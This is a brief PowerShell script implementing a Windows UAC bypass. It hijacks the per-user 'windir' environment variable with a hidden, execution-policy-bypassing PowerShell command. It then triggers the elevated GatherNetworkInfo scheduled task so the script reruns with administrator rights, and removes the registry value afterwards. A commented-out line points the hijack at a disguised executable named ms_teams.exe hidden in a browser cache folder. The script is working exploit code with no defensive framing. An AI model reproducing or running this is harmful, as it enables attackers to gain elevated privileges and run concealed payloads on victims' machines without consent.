
	mkdir C:\Windows\00uac_test

    $registryPath = "HKCU:\Environment"
    $Name = "windir"
	#$Value = "powershell -ep bypass -w h -c `"C:\Users\bob\AppData\Local\Google\Chrome\'User Data'\Default\Cache\ms_teams.exe`";#"
    $Value = "powershell -ep bypass -w h $PSCommandPath;#"
    Set-ItemProperty -Path $registryPath -Name $name -Value $Value
    #Depending on the performance of the machine, some sleep time may be required before or after schtasks
    schtasks /run /tn \Microsoft\Windows\NetTrace\GatherNetworkInfo /I | Out-Null
    Remove-ItemProperty -Path $registryPath -Name $name
